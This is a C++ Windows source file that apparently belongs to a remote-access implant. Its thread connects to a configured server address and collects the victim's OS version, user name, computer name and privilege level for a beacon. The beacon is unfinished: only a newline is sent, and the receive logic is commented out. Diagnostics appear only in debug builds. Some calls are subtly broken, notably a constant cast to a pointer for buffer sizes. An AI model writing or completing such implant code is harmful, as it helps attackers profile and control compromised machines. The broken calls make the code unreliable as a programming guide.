#include "network.h"
#include "sys.h"

DWORD __stdcall ServerThread() {
	struct addrinfo hints = {0}, *res, *ptr;
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	if (getaddrinfo(IP, PORT, &hints, &res)!=0) {
#ifdef DEBUG_BUILD
		std::cerr << "[network] getaddrinfo failed\n";
#endif
		WSACleanup();
		return ~0;
	}

	auto connSock = INVALID_SOCKET;
	for (ptr = res; ptr!=nullptr; ptr = ptr->ai_next) {
		connSock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if (connSock==SOCKET_ERROR) {
#ifdef DEBUG_BUILD
			std::cerr << "[network] connSock failed\n";
#endif
			closesocket(connSock);
			WSACleanup();
			return ~1;
		}

		if (connect(connSock, ptr->ai_addr, (int)ptr->ai_addrlen)==SOCKET_ERROR) {
			closesocket(connSock);
			connSock = INVALID_SOCKET;
			continue;
		}
		break;
	}
	freeaddrinfo(res);

	if (connSock==SOCKET_ERROR) {
#ifdef DEBUG_BUILD
		std::cerr << "[network] could not connect\n";
#endif
		closesocket(connSock);
		WSACleanup();
		return ~1;
	}

	// TODO: initialize to ID, delay
	auto sendInfo = new SendInfoStruct;
	sendInfo->osVersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

	GetVersionEx(&sendInfo->osVersionInfo);
	GetUserName(sendInfo->userName, (LPDWORD)257);
	GetComputerName(sendInfo->compName, (LPDWORD)257);
	sendInfo->isElevated = Sys::IsProcessElevated();

	const char *buf = "\n";
	if (send(connSock, buf, (int)strlen(buf), 0)==SOCKET_ERROR) {
#ifdef DEBUG_BUILD
		std::cerr << "[network] could not send init buf\n";
#endif
		closesocket(connSock);
		WSACleanup();
		return ~1;
	}

//	BOOL keepAlive = TRUE;
//	if (recv(connSock, buf, DEFAULT_BUFLEN, 0)==SOCKET_ERROR) {
//		std::cerr << "your socks\n";
//	}
//	keepAlive = (BOOL)buf;
//	std::cout << buf << std::endl;

	std::cout << "ded\n";
	closesocket(connSock);
	WSACleanup();
	return 0;
}
